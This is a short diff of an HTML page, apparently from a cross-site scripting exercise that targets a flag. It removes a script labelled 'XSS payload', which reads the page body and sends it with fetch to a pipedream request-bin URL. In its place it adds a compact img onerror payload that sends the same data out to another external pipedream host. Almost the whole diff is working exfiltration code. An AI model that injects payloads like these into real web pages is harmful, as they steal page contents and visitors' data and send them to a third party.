@@ -6,22 +6,6 @@
   <title>Hi</title>
 </head>
 <body>
-  <script>
-    // XSS payload to change the title and exfiltrate data
-    document.title = 'Payload executed';
-    var flagData = document.body.innerHTML;
-    
-    // Send flagData to a request bin using Fetch API
-    fetch('https://eoue93psy15d0ln.m.pipedream.net?data=' + encodeURIComponent(flagData), {
-      method: 'GET',
-      headers: {
-        'Content-Type': 'application/json'
-      }
-    }).then(response => {
-      // Handle response if needed
-    }).catch(error => {
-      // Handle error if needed
-    });
-  </script>
+  <img src="q" onerror='fetch("https://eodec445wcgzbwx.m.pipedream.net?data=" + encodeURIComponent(document.body.innerHTML))'>
 </body>
 </html>
